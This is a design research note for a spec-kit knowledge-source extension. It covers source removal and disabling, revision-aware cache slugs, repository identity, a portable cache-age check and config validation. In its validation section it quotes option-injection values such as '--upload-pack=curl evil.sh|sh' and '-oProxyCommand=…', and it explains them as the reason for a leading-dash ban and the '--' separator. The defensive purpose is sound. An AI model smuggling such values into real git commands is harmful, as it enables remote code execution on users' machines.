# Phase 0 — Research: Source Lifecycle & Cache Policy

**Feature**: [spec.md](spec.md) | **Plan**: [plan.md](plan.md) | **Date**: 2026-09-04

Six unknowns were extracted from the plan's Technical Context. Each is resolved below with the
decision, the rationale, and the alternatives that were considered and rejected. Two additional
gaps surfaced while researching and are recorded at the end.

---

## R1 — Where does the source lifecycle live?

**Question**: FR-001 requires "a command that removes a configured knowledge source", FR-002
requires that command to support a disable mode, and FR-005 requires "a way to re-enable". Do
these become a new command, or modes of the existing `configure`?

**Decision**: A new fifth command, **`speckit.knowledge.remove`**, owns all three operations:

| Invocation | Effect |
|------------|--------|
| `speckit.knowledge.remove <label>` | Delete the source entry **and** purge its cache (FR-001, FR-003) |
| `speckit.knowledge.remove <label> --disable` | Set `enabled: false`, retain the entry and its cache (FR-002, FR-004) |
| `speckit.knowledge.remove <label> --enable` | Set `enabled: true` (FR-005) |
| `speckit.knowledge.remove` (no argument) | List configured sources with their state and prompt for a selection (FR-006) |

**Rationale**:

- FR-002 says "**the** remove command", which presupposes a distinct command rather than a flag
  on `configure`.
- Constitution § Naming defines command IDs as `speckit.<ext-id>.<verb>`. `remove` is a verb and
  is the word a user reaches for; `speckit.knowledge.configure --remove` buries a destructive
  operation behind an additive-sounding name.
- Keeping disable and re-enable on the same command as remove makes the whole lifecycle
  discoverable from one help surface. Splitting re-enable onto `configure` would give the
  extension two commands that both mutate `enabled`, which Constitution §III (YAGNI, one way to
  do a thing) discourages more strongly than it discourages an awkward flag name.

**Acknowledged wart**: `remove --enable` reads oddly. It is accepted deliberately, because the
alternatives are worse:

| Alternative | Rejected because |
|-------------|------------------|
| Sixth command `speckit.knowledge.enable` | Command count 4 → 6 for one boolean; inflates the README table and the install surface |
| Re-enable via `configure <label> --enable` | Two commands mutating `enabled` — the ambiguity FR-028 exists to eliminate, reintroduced one layer up |
| `configure --remove` / `--disable` / `--enable` | Hides a destructive, cache-purging operation inside the command whose name promises addition |
| Rename to `speckit.knowledge.source` with sub-verbs | Nested verb parsing inside a prompt file; no precedent in the four existing commands |

The wart is mitigated in documentation: the command's `description` field reads "Remove,
disable, or re-enable a configured knowledge source", so the full lifecycle is visible in
`specify extension list` output and in the README table.

---

## R2 — Revision-aware cache slug

**Question**: The slug is `sha256(normalize(url))[:12]`. FR-011 and FR-012 require two revisions
of one repository to hold separate caches, while FR-024 and the spec's first Assumption require
that a source with no revision keeps the cache it already has.

**Decision**: Make the revision a *conditional* component of the hash input, separated by a
newline.

```sh
# normalized = url with trailing .git and trailing / stripped, lowercased  (unchanged)

if [ -z "$revision" ]; then
  hash_input=$(printf '%s' "$normalized")            # byte-identical to 1.3.0
else
  hash_input=$(printf '%s\n%s' "$normalized" "$revision")
fi

slug=$(printf '%s' "$hash_input" | sha256sum | cut -c1-12)   # shasum -a 256 on macOS
```

**Rationale**:

- An unpinned source hashes exactly the string it hashes today, so upgrading to 1.4.0 causes
  **zero** cache invalidation and **zero** re-downloads. This is what makes SC-005 achievable.
- A newline is the correct separator because it cannot occur in either operand: git refuses
  refnames containing control characters (`git check-ref-format`), and no URL scheme permits a
  raw newline. A naive `@` separator would be ambiguous, since SSH URLs already contain `@`:
  `url="git@h:o/r", rev="v1"` and `url="git@h:o/r@v1", rev=""` would collide.
- FR-012 then falls out for free: changing `revision` changes the hash input, which changes the
  slug, which means the next sync finds no cache at the new slug and performs a cold clone of
  the new revision. There is no invalidation logic to write and no stale-content window.

**Alternatives rejected**:

| Alternative | Rejected because |
|-------------|------------------|
| Always include the revision, defaulting to `HEAD` | Changes the slug for every existing unpinned source → every consumer re-downloads everything on upgrade. Violates FR-024 and SC-005. |
| Append the revision as a suffix directory: `cache/<slug>/<revision>/` | Revision names contain `/` (`refs/heads/main`, `feature/x`), so they are not safe path components without escaping — and escaping reintroduces the collision problem the hash already solves. |
| Store the revision only in `.manifest.json` and compare on read | Two revisions would share one directory; serving the second requires a full checkout swap on every sync. Directly contradicts FR-011. |

---

## R3 — Repository identity for conflict scoping

**Question**: FR-026 reports a shared path as a conflict only when the two sources' *repository
identity* differs. The spec's second Assumption states that identity ignores the access
protocol. What is the concrete derivation?

**Decision**: Repository identity is derived from the URL by a normalization that is
deliberately *more* aggressive than the slug normalization:

```text
1. Strip a leading scheme:            https://  http://  ssh://  git://  git+ssh://
2. Strip a leading credential:        anything up to and including the first "@"
3. Convert SCP-style to path form:    host:org/repo   →   host/org/repo
4. Strip a trailing ".git"
5. Strip a trailing "/"
6. Lowercase
```

Worked examples — all four of these yield the identity `github.com/org/payments`:

```text
https://github.com/org/payments.git
https://user@github.com/org/payments
git@github.com:org/payments
ssh://git@github.com/org/payments/
```

For a **local path** source, identity is the resolved absolute path (symlinks followed, `~`
expanded). A local clone is therefore *not* identified with the remote it was cloned from.

**Rationale**:

- Steps 1–3 are exactly what is needed to satisfy the spec's Assumption. Without them, a team
  where one developer uses HTTPS and another uses SSH would see every shared file reported as a
  conflict — precisely the noise FR-026 exists to remove.
- Identity is intentionally separate from the slug. The slug must distinguish
  `https://…` from `git@…` because they are different *fetch targets* with different credentials
  and different cache state; identity must unify them because they are the same *body of
  knowledge*. Collapsing the two concepts into one function would break either FR-011 or FR-026.

**Deferred, with rationale**: identifying a local path with its remote by reading
`git -C <path> remote get-url origin` was considered. It would make identity correct in the
mixed local/remote case, but it adds a subprocess call, a failure mode (no `origin`, bare repo,
detached remote) and a trust question (the local repo's remote can point anywhere) to a purely
advisory conflict report. Documented as a known limitation in the README instead.

---

## R4 — Portable cache-age comparison

**Question**: The freshness gate needs to answer "is this cache younger than `max_cache_age`?"
on both macOS/BSD and Linux/GNU. `date -d "$iso8601" +%s` is GNU-only;
`date -j -f '%Y-%m-%dT%H:%M:%SZ' "$iso8601" +%s` is BSD-only. `stat` differs likewise. The
extension declares no interpreter dependency beyond `git`.

**Decision**: Gate on the **mtime of `.manifest.json`** using POSIX `find -mmin`, which behaves
identically on both platforms and is already in the extension's tool surface.

```sh
# max_age_minutes is derived from max_cache_age: Nm → N, Nh → N*60, Nd → N*1440
if [ -n "$(find "$manifest" -maxdepth 0 -mmin +"$max_age_minutes" 2>/dev/null)" ]; then
  verdict=stale     # over policy → attempt a refresh
else
  verdict=fresh     # under policy → skip the network entirely
fi
```

The duration format is `<N><unit>` with `unit ∈ {m, h, d}` — `30m`, `4h`, `7d`. The `m`/`h`/`d`
multipliers are integer arithmetic that POSIX `sh` performs natively, so no parsing helper and
no script is required. Constitution §III is satisfied: the whole gate is four lines of prose in
the sync command file.

**Why mtime is sound here**: sync already writes `.manifest.json` **last**, deliberately, as its
"cache is complete" signal (existing sync step 6). Its mtime is therefore the moment the cache
became valid — semantically the same instant as the `synced_at` field it contains, without the
parsing problem.

**Display is unaffected.** `synced_at` remains the value rendered to the user ("last synced
2026-06-10T09:00:00Z — 29h ago") by both `sync` and `status`. If mtime and `synced_at` ever
disagree — a file copied without preserving timestamps, for example — the **gate is
authoritative** and the displayed timestamp is advisory. This is stated in the command files so
the discrepancy is explainable rather than mysterious.

**Alternatives rejected**:

| Alternative | Rejected because |
|-------------|------------------|
| `date` with a per-platform branch | Two code paths to keep correct, tested on neither. Exactly the accidental complexity §III forbids. |
| `python3 -c` one-liner | Adds an undeclared runtime dependency, violating Constitution §I ("no hidden runtime dependencies outside of what `extension.yml` declares"). Declaring it would raise the extension's install bar for every consumer, to save four lines. |
| Store epoch seconds in the manifest alongside `synced_at` | Still needs a portable "now" in epoch seconds to compare against — `date +%s` is portable, but this adds a manifest field to solve a problem `find` already solves with none. |
| ISO 8601 durations (`PT4H`, `P7D`) | Unfriendly in a hand-edited, team-committed config file. The spec's Assumption asks for a human-readable duration. |

---

## R5 — Validation rules, and where they run

**Question**: FR-029 requires one documented rule per field, applied **each time the
configuration is read**. What are the rules, and how are they shared across commands without
creating the hidden runtime dependency Constitution §I forbids?

**Decision — the rules.** Six rules, one per field:

| Field | Rule | Rejects |
|-------|------|---------|
| `url` | Non-empty. Either a local path (`/`, `./`, `../`, `~`) that exists and contains `.git`, or a remote URL matching `^(https?://\|ssh://\|git\+ssh://\|git@)`. Must not begin with `-`. | empty, `-oProxyCommand=…`, a bare word that is neither |
| `label` | Non-empty. No whitespace. Unique across all sources in the file (FR-028). | empty, `my source`, a duplicate |
| `revision` | Absent, or non-empty matching `^[A-Za-z0-9._/-]+$`. Must not begin with `-`, must not contain `..`, must not end with `.lock`. | `-u`, `--upload-pack=…`, `../evil`, `refs/heads/x.lock` |
| `path_filter` | Absent, or a string, or a list of strings. Each entry non-empty, no leading `/`, no `..`, must not begin with `-`. | `/etc`, `../..`, `--exclude=x` |
| `enabled` | Absent, or boolean `true`/`false`. | `"yes"`, `1` |
| `max_cache_age` | Absent, or matching `^[0-9]+[mhd]$`. | `4 hours`, `-1h`, `0x10h` |

**The leading-`-` ban is a security control, not a style rule.** Every one of these values is
interpolated into a `git` command line by the executing agent. A `revision` of
`--upload-pack=curl evil.sh|sh` passed to `git fetch` is remote code execution; a `path_filter`
beginning with `-` is at minimum a git argument the user did not intend. Two mitigations are
required together — this is now stated normatively as **FR-034** — because either alone is
insufficient:

1. **Validate** — reject any value beginning with `-` before it is used.
2. **Separate** — every `git` invocation that consumes a config value places `--` before it, so
   even a value that slipped through cannot be reparsed as an option:
   `git fetch --depth=1 origin -- "$revision"`, `git sparse-checkout set -- "$p1" "$p2"`.

**Decision — where they run.** The rules are stated once canonically in
[contracts/knowledge-config.schema.md](contracts/knowledge-config.schema.md) and **duplicated
verbatim** into each command file that reads configuration (`configure`, `sync`, `status`).

This duplication is deliberate. Constitution §I requires each command to be "a self-contained
Markdown document — no hidden runtime dependencies outside of what `extension.yml` declares".
A shared `validation-rules.md` that the other files told the agent to go read would be exactly
such a dependency: it would not be listed in `provides.commands`, so spec-kit would not install
it, and every command would break at runtime in a consumer project. The precedent already
exists in this repository — the Source Slug Generation and Cache Integrity Check algorithms are
duplicated between `sync` and `status` for the same reason, with a header noting the sharing.
The new blocks carry the same header.

**Failure behavior** (FR-030): a value that fails its rule skips **only its own source**, with a
message naming the field and the offending value. Every other source is processed normally and
the command exits 0.

---

## R6 — Fetching a pinned commit SHA under `--depth=1`

**Question**: The cold path clones with `--filter=blob:none --no-checkout --depth=1`. Branches
and tags can be pinned with `--branch <name>`, but a full commit SHA cannot — `git clone
--branch` rejects a SHA. How is a SHA-pinned source fetched, and what happens when the server
refuses?

**Decision**: A three-tier ladder, ending in the FR-015 fallback that already exists.

```sh
# Tier 1 — branch or tag (the common case)
timeout 10 git clone --filter=blob:none --no-checkout --depth=1 \
  --branch "$revision" -- "$url" "$cache_dir"

# Tier 2 — full commit SHA: clone empty, then fetch that one object
timeout 10 git clone --filter=blob:none --no-checkout --depth=1 -- "$url" "$cache_dir"
timeout 10 git -C "$cache_dir" fetch --depth=1 origin -- "$revision"
git -C "$cache_dir" checkout -- "$revision"

# Tier 3 — server refuses an arbitrary SHA: deepen once, then retry
timeout 30 git -C "$cache_dir" fetch --unshallow origin
git -C "$cache_dir" checkout -- "$revision"
```

Tier selection: try Tier 1 first — it succeeds for every branch and tag and is the cheapest.
If it fails **and** `$revision` looks like a full SHA (`^[0-9a-f]{40}$` or `^[0-9a-f]{64}$` for
SHA-256 repositories), escalate to Tier 2, then Tier 3.

**Why Tier 3 exists**: fetching an arbitrary commit by SHA requires the server to advertise
`uploadpack.allowAnySHA1InWant` (or `allowReachableSHA1InWant`). GitHub and GitLab enable it;
self-hosted Gitea, Bitbucket Server, and bare-repo-over-SSH deployments frequently do not. On
those servers Tier 2 fails with `error: Server does not allow request for unadvertised object`.
Tier 3 trades bandwidth for correctness by unshallowing, with a longer timeout (30s) because it
is a full history fetch.

**When all three fail**: this is precisely FR-015 — "when a declared revision cannot be resolved
on the remote, that source MUST be reported as unreachable and fall back to its existing cache
if one is intact." No new failure path is introduced; the existing Cache Integrity Check and
`unreachable` status handle it, and the exit code stays 0.

**Abbreviated SHAs are rejected**, not escalated. A 7-character prefix is not fetchable by any
tier and, worse, is not stable — it can become ambiguous as the repository grows. The validation
rule in R5 accepts them syntactically (they match `^[A-Za-z0-9._/-]+$`), so `sync` reports them
at Tier-1 failure as an unresolvable revision rather than silently degrading.

---

## Gaps discovered during research

Neither was covered by a Functional Requirement when this document was written. Both have since
been **promoted to requirements** in [spec.md](spec.md) after cross-artifact analysis. They are
kept here in their original framing, because the reasoning that surfaced them is still the
reasoning behind the requirement.

### G1 — A revision change orphans the previous cache directory → **FR-032**

FR-003 purges the cache when a source is **removed**. But R2 makes the slug a function of the
revision, so editing `revision` in place also strands the old directory — with no requirement
covering it. Over a few revision bumps a project accumulates dead cache trees that nothing will
ever read or delete, which is the same "orphaned cache directories accumulate" outcome FR-003
was written to prevent.

**Required handling (FR-032)**: `sync` prunes cache directories that match the slug of **no**
configured source. The prune set must be computed against *all* configured sources, enabled
**and** disabled, because FR-004 requires a disabled source to keep its cache. Pruning runs after
the per-source loop and reports each removal on its own line.

### G2 — `status`'s 24-hour heuristic collides with `max_cache_age` → **FR-033**

`speckit.knowledge.status.md` currently defines `fresh` as "synced_at is within the last 24h"
and `cached` as older. Once `max_cache_age` exists, a source with `max_cache_age: 7d` synced
three days ago is *fresh by policy* but *cached by the heuristic* — two contradictory labels for
one state.

**Required handling (FR-033)**: when a source has an effective `max_cache_age`, the policy
determines the label. The 24-hour heuristic survives **only** as the default for sources with no
policy, which is required by FR-024 for projects that upgrade and change nothing. `status`
renders the threshold it used, so the label is never unexplained.
